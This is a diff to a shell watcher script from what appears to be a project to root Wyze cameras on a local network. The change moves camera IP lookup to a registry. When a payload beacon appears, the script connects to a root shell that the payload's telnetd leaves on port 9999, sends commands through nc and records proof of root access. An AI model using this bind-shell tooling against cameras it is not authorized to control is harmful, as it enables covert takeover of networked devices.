@@ -3,7 +3,15 @@
 HERE="$(cd "$(dirname "$0")/../scripts" && pwd)"
 ROOT_PROOF="$HERE/root_proof.py"
 WAIT_LEDGER="$HERE/wait_ledger.py"
+REGISTRY_PY="$HERE/registry.py"
 PY=/opt/homebrew/bin/python3
+# Cameras come from the registry (single truth): wyze-family ids by MAC.
+# Falls back to the historical octets if the registry is unreadable.
+WYZE_IPS=$("$PY" "$REGISTRY_PY" resolve wyze-39 --sweep 2>/dev/null | awk -F'ip=' '{print $2}' | awk '{print $1}')
+WYZE_IPS2=$("$PY" "$REGISTRY_PY" resolve wyze-51 --sweep 2>/dev/null | awk -F'ip=' '{print $2}' | awk '{print $1}')
+CAM_LIST="${WYZE_IPS%% *},${WYZE_IPS2%% *}"
+case "$CAM_LIST" in *,*) ;; *) CAM_LIST="192.168.4.39,192.168.4.51";; esac
+octet() { echo "${1##*.}"; }
 proof() { # proof <ip> <vector...> — machine-checkable RootProof, best-effort
   [ -x "$PY" ] && [ -f "$ROOT_PROOF" ] && "$PY" "$ROOT_PROOF" "$@" >> /tmp/liberation_proofs.log 2>&1 || true
 }
@@ -22,15 +30,16 @@ while true; do
   if [ "$B" -gt "$B0" ]; then
     echo "$(date '+%H:%M:%S') *** NEW BEACON — payload executed ***"
     grep BEACON /tmp/fss_beacons.log | tail -1
-    for cam in 39 51; do
+    for ip in $(echo "$CAM_LIST" | tr ',' ' '); do
+      cam=$(octet "$ip")
       mkdir -p /tmp/pane1/192.168.4.$cam
-      if timeout 4 bash -c "exec 3<>/dev/tcp/192.168.4.$cam/9999" 2>/dev/null; then
-        echo "$(date '+%H:%M:%S') *** ROOT SHELL on .$cam:9999 — capturing id + RootProof ***"
-        (printf 'id > /tmp/root_proof.txt; cat /proc/version >> /tmp/root_proof.txt\n'; sleep 2) | timeout 8 nc 192.168.4.$cam 9999 > /tmp/pane1/192.168.4.$cam/root_via_9999.txt 2>/dev/null
+      if timeout 4 bash -c "exec 3<>/dev/tcp/$ip/9999" 2>/dev/null; then
+        echo "$(date '+%H:%M:%S') *** ROOT SHELL on $ip:9999 — capturing id + RootProof ***"
+        (printf 'id > /tmp/root_proof.txt; cat /proc/version >> /tmp/root_proof.txt\n'; sleep 2) | timeout 8 nc $ip 9999 > /tmp/pane1/192.168.4.$cam/root_via_9999.txt 2>/dev/null
         echo "$(date '+%H:%M:%S') proof bytes: $(wc -c < /tmp/pane1/192.168.4.$cam/root_via_9999.txt 2>/dev/null)"
-        proof "192.168.4.$cam" telnet9999
-        proof "192.168.4.$cam" beacon-uid0
-        waits "wyze-192.168.4.$cam" "root shell via payload telnetd :9999" observed \
+        proof "$ip" telnet9999
+        proof "$ip" beacon-uid0
+        waits "wyze-$ip" "root shell via payload telnetd :9999" observed \
           "beacon + shell captured by liberation_watch $(date '+%F %T')"
       fi
     done
